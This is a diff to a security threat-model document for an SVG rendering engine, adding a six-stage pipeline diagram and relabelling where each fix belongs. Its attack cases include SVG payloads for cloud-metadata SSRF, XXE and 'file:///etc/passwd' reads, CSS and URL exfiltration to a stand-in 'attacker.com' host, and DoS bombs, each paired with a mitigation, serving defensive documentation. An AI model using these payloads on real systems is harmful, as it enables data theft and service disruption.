@@ -16,8 +16,8 @@ Each case has a number (`section.case`, e.g. `3.1`) and four parts:
     all (e.g. `<script>`, event handlers, `<foreignObject>`, `<a>`, SMIL,
     `javascript:` URLs), so there is nothing to exploit today.
   - **Where + Describe the fix** — for anything that *is* supported:
-    - **Where** — the earliest stage and the exact `crate::module::function`
-      / file to change.
+    - **Where** — the earliest stage (numbered 1–6) and the exact
+      `crate::module::function` / file to change.
     - **Describe the fix** — the concrete mitigation (DoS entries list
       *suggested starting limits*, not current behavior).
 
@@ -43,6 +43,69 @@ claim that the engine defends against it.
 > exfiltration** via those same URLs, and the **DoS** vectors (only `<use>`
 > cycles are guarded). The rest matter only if the engine is ever fed untrusted
 > or uploaded SVG.
+
+## SVG rendering pipeline & security layers
+
+The SVG engine is a six-stage pipeline; each stage consumes the previous
+stage's output and produces the next. Stages are numbered 1–6 in pipeline order.
+Stages 1–5 each have a **security layer** (a rectangle) that sits between the
+stage and the next one: `yes` forwards the data on, `no` drops it into a warning
+box.
+
+```mermaid
+flowchart TD
+    IN(["SVG document"]) -->|"SVG text (XML)"| PARSE
+
+    PARSE["<b>1. Parse</b> — script thread<br/>xml5ever — text → DOM tree"]
+    PARSE -->|"DOM tree"| SEC1["validate XML, entity & depth"]
+    SEC1 -->|"no"| WARN1["⚠ block & log"]
+    SEC1 -->|"yes"| STYLE
+
+    STYLE["<b>2. Style</b> — layout thread<br/>Stylo — CSS cascade → computed styles"]
+    STYLE -->|"styled elements"| SEC2["block external @import / url()"]
+    SEC2 -->|"no"| WARN2["⚠ block & log"]
+    SEC2 -->|"yes"| BUILD
+
+    BUILD["<b>4. Build</b> — layout thread<br/>layout::svg — resolve use, geometry, paints"]
+    BUILD -->|"SVG render tree"| SEC4["cap use, geometry & count"]
+    SEC4 -->|"yes"| RENDER
+    SEC4 -->|"no"| WARN4["⚠ block & log"]
+
+    RENDER["<b>5. Render</b> — layout thread<br/>svg_engine — native primitives or CPU rasterize"]
+    RENDER -->|"display list commands"| SEC5["audit FFI & recursion"]
+    SEC5 -->|"yes"| BACKEND
+    SEC5 -->|"no"| WARN5["⚠ block & log"]
+
+    BACKEND["<b>6. Render Service Backend</b> — render backend thread<br/>WebRender — draw display list to screen"]
+    BACKEND -->|"pixels (frames)"| OUT(["screen output"])
+
+    FETCH["<b>3. Fetch</b> — net thread<br/>net — load images, fonts, stylesheets"]
+    FETCH -->|"resources"| SEC3["block untrusted URLs"]
+    SEC3 -->|"yes"| STYLE
+    SEC3 -->|"yes"| BUILD
+    SEC3 -->|"no"| WARN3["⚠ block & log"]
+
+    classDef stage fill:#dbeafe,stroke:#93c5fd,color:#1e3a8a;
+    classDef guard fill:#93c5fd,stroke:#2563eb,color:#172554;
+    classDef warn fill:#fecaca,stroke:#ef4444,color:#7f1d1d;
+
+    class PARSE,STYLE,BUILD,RENDER,BACKEND,FETCH stage;
+    class SEC1,SEC2,SEC3,SEC4,SEC5 guard;
+    class WARN1,WARN2,WARN3,WARN4,WARN5 warn;
+```
+
+- **1. Parse** — `xml5ever`, script thread — turns SVG text into a DOM tree.
+- **2. Style** — `stylo`, layout thread — applies CSS and computes each element's final styles.
+- **3. Fetch** — `net`, net thread — loads external resources — images, fonts,
+  and stylesheets — on demand from style and build.
+- **4. Build** — `layout::svg`, layout thread — resolves `<use>`, geometry, and
+  paint servers into an SVG render tree.
+- **5. Render** — `svg_engine`, layout thread — turns the render tree into
+  display-list commands — native WebRender primitives, or CPU-rasterized images.
+- **6. Render Service Backend** — `webrender`, render backend thread — draws the
+  display-list commands to the screen.
+- **Security layers** (rectangles) gate stages 1–5: `yes` forwards the data on,
+  `no` blocks it and logs the attack.
 
 ---
 
@@ -76,7 +139,7 @@ of whatever is running the engine.
 ```
 
 - **Fix:**
-  - **Where:** path parser `layout::svg::geometry::parse_path` ([geometry.rs:362](components/layout/svg/geometry.rs#L362)).
+  - **Where (Stage 4 — Build):** path parser `layout::svg::geometry::parse_path` ([geometry.rs:362](components/layout/svg/geometry.rs#L362)).
   - **Describe the fix:** fuzz the path parser with malformed `d` strings (cargo-fuzz / OSS-Fuzz) and audit any `unsafe` there; treat a panic as a bug to fix, not a crash to swallow.
 
 **1.2 — Malformed shape geometry** *(tessellator + rasterizer)*
@@ -93,7 +156,7 @@ tessellator/rasterizer.
 ```
 
 - **Fix:**
-  - **Where:** tessellator `svg_engine::tessellator` ([tessellator.rs](components/svg_engine/src/tessellator.rs)) via `lyon`; rasterizer `svg_engine::renderer` ([renderer/](components/svg_engine/src/renderer/)) via `vello_cpu`.
+  - **Where (Stage 5 — Render):** tessellator `svg_engine::tessellator` ([tessellator.rs](components/svg_engine/src/tessellator.rs)) via `lyon`; rasterizer `svg_engine::renderer` ([renderer/](components/svg_engine/src/renderer/)) via `vello_cpu`.
   - **Describe the fix:** fuzz the tessellator and rasterizer with degenerate geometry and audit their `unsafe` blocks.
 
 **1.3 — Crafted `<text>` → font shaping** *(FFI — HarfBuzz)*
@@ -109,7 +172,7 @@ the C font-shaping library (HarfBuzz) across the FFI boundary.
 ```
 
 - **Fix:**
-  - **Where:** `fonts` (HarfBuzz FFI) — the text shaper.
+  - **Where (Stage 5 — Render):** `fonts` (HarfBuzz FFI) — the text shaper.
   - **Describe the fix:** fuzz font shaping, keep HarfBuzz up to date, and audit the FFI glue.
 
 **1.4 — Embedded `<image>` → decode** *(FFI — `resvg`/`tiny-skia`)*
@@ -125,7 +188,7 @@ memory-safety bug in the image decoder.
 ```
 
 - **Fix:**
-  - **Where:** `net::image_cache` ([image_cache.rs](components/net/image_cache.rs)) — `resvg`/`tiny-skia` decode.
+  - **Where (Stage 3 — Fetch):** `net::image_cache` ([image_cache.rs](components/net/image_cache.rs)) — `resvg`/`tiny-skia` decode.
   - **Describe the fix:** fuzz image decode and audit the FFI/`unsafe` boundary.
 
 ## 2. Cross-Site Scripting (XSS) — active content
@@ -240,7 +303,7 @@ theft), internal services, and port scanning of the private network.
 <svg><image href="http://169.254.169.254/latest/meta-data/" width="100" height="100"/></svg>
 ```
 - **Fix:**
-  - **Where (fetch — earliest):** `net::http_loader` scheme dispatch ([http_loader.rs:281](components/net/http_loader.rs#L281), non-`http(s)` guard at [http_loader.rs:1193](components/net/http_loader.rs#L1193)) — add the URL allowlist here so blocked schemes never reach the network; SVG initiates the fetch at `layout::svg::builder::build_image_tag` ([builder.rs:699](components/layout/svg/builder.rs#L699)).
+  - **Where (Stage 3 — Fetch, earliest):** `net::http_loader` scheme dispatch ([http_loader.rs:281](components/net/http_loader.rs#L281), non-`http(s)` guard at [http_loader.rs:1193](components/net/http_loader.rs#L1193)) — add the URL allowlist here so blocked schemes never reach the network; SVG initiates the fetch at `layout::svg::builder::build_image_tag` ([builder.rs:699](components/layout/svg/builder.rs#L699)).
   - **Describe the fix:** add a URL allowlist at image resolution — allow only same-origin / `data:` / `blob:`; reject `http(s)://` and `file://` unless the caller explicitly opts in.
 
 **3.2 — External stylesheet / `@import`**
@@ -255,7 +318,7 @@ block.
 <svg><style>@import url("http://169.254.169.254/…");</style></svg>
 ```
 - **Fix:**
-  - **Where (style — earliest):** Stylo `stylo` crate — external git dependency (`servo/stylo`, patched to `mu-mostafa98/stylo` `svg-engine` branch); stylesheet loader / `@import`/`url()`. Not in `svg_engine` or this repo tree.
+  - **Where (Stage 2 — Style, earliest):** Stylo `stylo` crate — external git dependency (`servo/stylo`, patched to `mu-mostafa98/stylo` `svg-engine` branch); stylesheet loader / `@import`/`url()`. Not in `svg_engine` or this repo tree.
   - **Describe the fix:** strip external `@import`/`url()` from SVG `<style>` (sanitize), or route them through the same fetch allowlist.
 
 **3.3 — External font (`@font-face`)**
@@ -270,7 +333,7 @@ block.
 <svg><style>@font-face { font-family:x; src:url("http://internal/…"); }</style></svg>
 ```
 - **Fix:**
-  - **Where (style — earliest):** Stylo `stylo` crate (external git dep) — `@font-face` rule + external `src` fetch. Not in `svg_engine`.
+  - **Where (Stage 2 — Style, earliest):** Stylo `stylo` crate (external git dep) — `@font-face` rule + external `src` fetch. Not in `svg_engine`.
   - **Describe the fix:** block external `@font-face src` fetches via the same allowlist; fall back to system fonts.
 
 ## 4. Information Disclosure — file read
@@ -292,7 +355,7 @@ document and, from there, to the attacker.
 <svg><text>&xxe;</text></svg>
 ```
 - **Fix:**
-  - **Where (parse — earliest):** XML parser — `xml5ever` via `script::dom::servoparser::xml::Tokenizer` ([xml.rs:42](components/script/dom/servoparser/xml.rs#L42)) — disable external DTD/entity resolution at tokenizer/tree-builder construction.
+  - **Where (Stage 1 — Parse, earliest):** XML parser — `xml5ever` via `script::dom::servoparser::xml::Tokenizer` ([xml.rs:42](components/script/dom/servoparser/xml.rs#L42)) — disable external DTD/entity resolution at tokenizer/tree-builder construction.
   - **Describe the fix:** disable external-entity/DTD resolution in the XML parser — verify Servo's parser neither loads external DTDs nor expands external entities.
 
 **4.2 — Local file inclusion via `file://` URL**
@@ -306,7 +369,7 @@ document and, from there, to the attacker.
 <svg><image href="file:///etc/passwd" width="100" height="100"/></svg>
 ```
 - **Fix:**
-  - **Where (fetch — earliest):** `net::http_loader` ([http_loader.rs:281](components/net/http_loader.rs#L281)) — reject `file://`/local schemes at the fetch layer (`is_local_scheme`); SVG resolution point is `layout::svg::builder::build_image_tag` ([builder.rs:699](components/layout/svg/builder.rs#L699)).
+  - **Where (Stage 3 — Fetch, earliest):** `net::http_loader` ([http_loader.rs:281](components/net/http_loader.rs#L281)) — reject `file://`/local schemes at the fetch layer (`is_local_scheme`); SVG resolution point is `layout::svg::builder::build_image_tag` ([builder.rs:699](components/layout/svg/builder.rs#L699)).
   - **Describe the fix:** reject the `file://` scheme in image/CSS URL resolution (same allowlist as SSRF).
 
 ## 5. Data Exfiltration
@@ -331,7 +394,7 @@ leaked one character at a time to the attacker's server.
 ```
 - **Known real cases:** [CVE-2026-40301](https://github.com/advisories/GHSA-93vf-569f-22cq) (SVG `<style>` passes `url()`/`@import` unfiltered), [Snipe-IT CVE-2026-86738](https://vuldb.com/cve/CVE-2026-86738), [PortSwigger blind CSS exfiltration](https://portswigger.net/research/blind-css-exfiltration).
 - **Fix:**
-  - **Where (style — earliest):** Stylo `stylo` + `selectors` crates (external git deps) — cascade / attribute-selector matching for SVG `<style>`. Not in `svg_engine`.
+  - **Where (Stage 2 — Style, earliest):** Stylo `stylo` + `selectors` crates (external git deps) — cascade / attribute-selector matching for SVG `<style>`. Not in `svg_engine`.
   - **Describe the fix:** sanitize SVG `<style>` — strip external `url()`/`@import` or whitelist declarations; render SVG in an origin-isolated context so its CSS can't touch host-DOM data.
 
 **5.2 — External URL in an attribute** *(sends a known secret)*
@@ -346,7 +409,7 @@ directly to the attacker's server.
 <svg><image href="https://attacker.com/collect?d=SECRET" width="1" height="1"/></svg>
 ```
 - **Fix:**
-  - **Where (fetch — earliest):** `net::http_loader` ([http_loader.rs:281](components/net/http_loader.rs#L281)) — same scheme/URL allowlist as SSRF; SVG fetch initiated at `layout::svg::builder::build_image_tag` ([builder.rs:699](components/layout/svg/builder.rs#L699)).
+  - **Where (Stage 3 — Fetch, earliest):** `net::http_loader` ([http_loader.rs:281](components/net/http_loader.rs#L281)) — same scheme/URL allowlist as SSRF; SVG fetch initiated at `layout::svg::builder::build_image_tag` ([builder.rs:699](components/layout/svg/builder.rs#L699)).
   - **Describe the fix:** same URL allowlist — block external URLs, or don't resolve external references at all.
 
 ## 6. Denial of Service (DoS) — resource exhaustion
@@ -370,7 +433,7 @@ below are **suggested starting limits** — none are implemented yet.
 <svg><g><g><g> <!-- …100,000 nested <g>… --> </g></g></g></svg>
 ```
 - **Fix:**
-  - **Where (parse — earliest):** `script::dom::servoparser::Sink` — `create_element` ([mod.rs:1831](components/script/dom/servoparser/mod.rs#L1831)) / `create_element_for_token` (:2129): cap tree depth during DOM construction. Defense-in-depth at render: `svg_engine::traversal::render_svg_tree` / `render_node` ([traversal.rs:36](components/svg_engine/src/traversal.rs#L36)).
+  - **Where (Stage 1 — Parse, earliest):** `script::dom::servoparser::Sink` — `create_element` ([mod.rs:1831](components/script/dom/servoparser/mod.rs#L1831)) / `create_element_for_token` (:2129): cap tree depth during DOM construction. Defense-in-depth at render: `svg_engine::traversal::render_svg_tree` / `render_node` ([traversal.rs:36](components/svg_engine/src/traversal.rs#L36)).
   - **Describe the fix:** cap element nesting depth (e.g. max 512).
 
 **6.2 — Deep acyclic `<use>` chain**
@@ -390,7 +453,7 @@ below are **suggested starting limits** — none are implemented yet.
 </svg>
 ```
 - **Fix:**
-  - **Where (build):** `layout::svg::builder::resolve_use_children` ([builder.rs:525](components/layout/svg/builder.rs#L525)).
+  - **Where (Stage 4 — Build):** `layout::svg::builder::resolve_use_children` ([builder.rs:525](components/layout/svg/builder.rs#L525)).
   - **Describe the fix:** cap `<use>` resolution depth (e.g. max 256), alongside the existing cycle set.
 
 ### `<use>` cycles
@@ -406,7 +469,7 @@ below are **suggested starting limits** — none are implemented yet.
 <svg><g id="a"><use href="#a"/></g></svg>
 ```
 - **Fix:**
-  - **Where (build):** `layout::svg::builder::resolve_use_children` ([builder.rs:525](components/layout/svg/builder.rs#L525)) — the existing `resolving` path-set.
+  - **Where (Stage 4 — Build):** `layout::svg::builder::resolve_use_children` ([builder.rs:525](components/layout/svg/builder.rs#L525)) — the existing `resolving` path-set.
   - **Describe the fix:** already in place — the `resolving` path-set stops the cycle; keep it.
 
 **6.4 — Indirect cycle** — `covered` (cycle detection)
@@ -420,7 +483,7 @@ below are **suggested starting limits** — none are implemented yet.
 <svg><g id="l1"><use href="#l2"/></g><g id="l2"><use href="#l1"/></g></svg>
 ```
 - **Fix:**
-  - **Where (build):** `layout::svg::builder::resolve_use_children` ([builder.rs:525](components/layout/svg/builder.rs#L525)) — the existing `resolving` path-set.
+  - **Where (Stage 4 — Build):** `layout::svg::builder::resolve_use_children` ([builder.rs:525](components/layout/svg/builder.rs#L525)) — the existing `resolving` path-set.
   - **Describe the fix:** already in place; keep.
 
 ### `<use>` amplification
@@ -441,7 +504,7 @@ below are **suggested starting limits** — none are implemented yet.
 </svg>
 ```
 - **Fix:**
-  - **Where (build):** `layout::svg::builder::resolve_use_children` ([builder.rs:525](components/layout/svg/builder.rs#L525)).
+  - **Where (Stage 4 — Build):** `layout::svg::builder::resolve_use_children` ([builder.rs:525](components/layout/svg/builder.rs#L525)).
   - **Describe the fix:** cap the total expanded node count after `<use>` resolution (e.g. max 100,000).
 
 **6.6 — Quadratic blow-up**
@@ -460,7 +523,7 @@ below are **suggested starting limits** — none are implemented yet.
 </svg>
 ```
 - **Fix:**
-  - **Where (build):** `layout::svg::builder::resolve_use_children` ([builder.rs:525](components/layout/svg/builder.rs#L525)).
+  - **Where (Stage 4 — Build):** `layout::svg::builder::resolve_use_children` ([builder.rs:525](components/layout/svg/builder.rs#L525)).
   - **Describe the fix:** same total expanded-node cap.
 
 **6.7 — Command amplification (big-but-legit subtree)**
@@ -477,7 +540,7 @@ below are **suggested starting limits** — none are implemented yet.
 </svg>
 ```
 - **Fix:**
-  - **Where (build):** `layout::svg::builder::resolve_use_children` ([builder.rs:525](components/layout/svg/builder.rs#L525)).
+  - **Where (Stage 4 — Build):** `layout::svg::builder::resolve_use_children` ([builder.rs:525](components/layout/svg/builder.rs#L525)).
   - **Describe the fix:** cap the number of `<use>` instances (e.g. max 10,000) in addition to the node-count cap.
 
 ### Geometry & rendering bombs
@@ -493,7 +556,7 @@ below are **suggested starting limits** — none are implemented yet.
 <svg width="100000" height="100000"><rect width="100000" height="100000"/></svg>
 ```
 - **Fix:**
-  - **Where (build):** `layout::svg::build_svg_render_tree` ([mod.rs:41](components/layout/svg/mod.rs#L41)) — viewport/viewBox setup.
+  - **Where (Stage 4 — Build):** `layout::svg::build_svg_render_tree` ([mod.rs:41](components/layout/svg/mod.rs#L41)) — viewport/viewBox setup.
   - **Describe the fix:** keep the `u16` side cap, and add a pixel-area cap (e.g. max 2²⁸ ≈ 268 M px); reject larger viewports up front.
 
 **6.9 — Unclamped blur `stdDeviation`**
@@ -508,7 +571,7 @@ below are **suggested starting limits** — none are implemented yet.
 <rect width="100" height="100" filter="url(#b)"/></svg>
 ```
 - **Fix:**
-  - **Where (build):** `layout::svg::defines::FilterParser` ([defines.rs:332](components/layout/svg/defines.rs#L332)) — `feGaussianBlur` branch at :400-401.
+  - **Where (Stage 4 — Build):** `layout::svg::defines::FilterParser` ([defines.rs:332](components/layout/svg/defines.rs#L332)) — `feGaussianBlur` branch at :400-401.
   - **Describe the fix:** clamp `feGaussianBlur` `stdDeviation` (e.g. [0, 1000], or ≤ the filter region size).
 
 **6.10 — Huge path segment count → tessellation blowup**
@@ -522,7 +585,7 @@ below are **suggested starting limits** — none are implemented yet.
 <svg><path d="M0,0 L1,1 L2,2 L3,3 <!-- …1,000,000 segments… -->"/></svg>
 ```
 - **Fix:**
-  - **Where (build):** `layout::svg::geometry::parse_path` ([geometry.rs:362](components/layout/svg/geometry.rs#L362)).
+  - **Where (Stage 4 — Build):** `layout::svg::geometry::parse_path` ([geometry.rs:362](components/layout/svg/geometry.rs#L362)).
   - **Describe the fix:** cap the `d` command/segment count (e.g. max 100,000).
 
 **6.11 — Excessive element count**
@@ -536,7 +599,7 @@ below are **suggested starting limits** — none are implemented yet.
 <svg> <!-- 500,000 × <rect/> --> </svg>
 ```
 - **Fix:**
-  - **Where (parse — earliest):** `script::dom::servoparser::Sink` — `create_element` ([mod.rs:1831](components/script/dom/servoparser/mod.rs#L1831)) / `parse_complete_string_chunk` (:679): cap total element count during DOM construction.
+  - **Where (Stage 1 — Parse, earliest):** `script::dom::servoparser::Sink` — `create_element` ([mod.rs:1831](components/script/dom/servoparser/mod.rs#L1831)) / `parse_complete_string_chunk` (:679): cap total element count during DOM construction.
   - **Describe the fix:** cap total element count (e.g. max 100,000).
 
 **6.12 — Recursive paint server (pattern)**
@@ -551,7 +614,7 @@ below are **suggested starting limits** — none are implemented yet.
 <rect width="100" height="100" fill="url(#p)"/></svg>
 ```
 - **Fix:**
-  - **Where (render):** `svg_engine::visitor::PaintServerFixupVisitor` ([visitor.rs:23](components/svg_engine/src/visitor.rs#L23)) and `svg_engine::renderer::pattern` ([pattern.rs](components/svg_engine/src/renderer/pattern.rs)).
+  - **Where (Stage 5 — Render):** `svg_engine::visitor::PaintServerFixupVisitor` ([visitor.rs:23](components/svg_engine/src/visitor.rs#L23)) and `svg_engine::renderer::pattern` ([pattern.rs](components/svg_engine/src/renderer/pattern.rs)).
   - **Describe the fix:** cap paint-server reference depth (e.g. max 16 nested `url(#…)` resolutions).
 
 **6.13 — Extreme stroke / dash values**
@@ -565,7 +628,7 @@ below are **suggested starting limits** — none are implemented yet.
 <svg><path d="M0,0 L1000,1000" stroke="black" stroke-width="1000000" stroke-dasharray="1 1000000"/></svg>
 ```
 - **Fix:**
-  - **Where (build):** `layout::svg::style::apply_stroke_presentation_attrs` ([style.rs:344](components/layout/svg/style.rs#L344)) — `stroke-width` :393, `stroke-dasharray` :422.
+  - **Where (Stage 4 — Build):** `layout::svg::style::apply_stroke_presentation_attrs` ([style.rs:344](components/layout/svg/style.rs#L344)) — `stroke-width` :393, `stroke-dasharray` :422.
   - **Describe the fix:** clamp `stroke-width` (e.g. ≤ 10,000) and bound `stroke-dasharray` length/value range.
 
 ### Parser-level DoS
@@ -587,7 +650,7 @@ below are **suggested starting limits** — none are implemented yet.
 <svg>&c;</svg>
 ```
 - **Fix:**
-  - **Where (parse — earliest):** XML parser — `xml5ever` via `script::dom::servoparser::xml::Tokenizer` ([xml.rs:42](components/script/dom/servoparser/xml.rs#L42)) — enforce entity-expansion limits at tokenizer/tree-builder construction.
+  - **Where (Stage 1 — Parse, earliest):** XML parser — `xml5ever` via `script::dom::servoparser::xml::Tokenizer` ([xml.rs:42](components/script/dom/servoparser/xml.rs#L42)) — enforce entity-expansion limits at tokenizer/tree-builder construction.
   - **Describe the fix:** parser-level entity-expansion limits (libxml2-style caps) — verify Servo's XML parser applies them.
 
 **6.15 — Decompression bomb (SVGZ / gzip)** *(CWE-409)*
@@ -650,7 +713,7 @@ execution / data tampering in the host.
 <svg width="1" height="1"><image href="https://tracker.example/pixel.svg"/></svg>
 ```
 - **Fix:**
-  - **Where (fetch — earliest):** `net::http_loader` ([http_loader.rs:281](components/net/http_loader.rs#L281)) — same URL allowlist as SSRF; SVG fetch initiated at `layout::svg::builder::build_image_tag` ([builder.rs:699](components/layout/svg/builder.rs#L699)).
+  - **Where (Stage 3 — Fetch, earliest):** `net::http_loader` ([http_loader.rs:281](components/net/http_loader.rs#L281)) — same URL allowlist as SSRF; SVG fetch initiated at `layout::svg::builder::build_image_tag` ([builder.rs:699](components/layout/svg/builder.rs#L699)).
   - **Describe the fix:** block external fetches by default (the same URL allowlist), so no third-party request can be triggered.
 
 ---
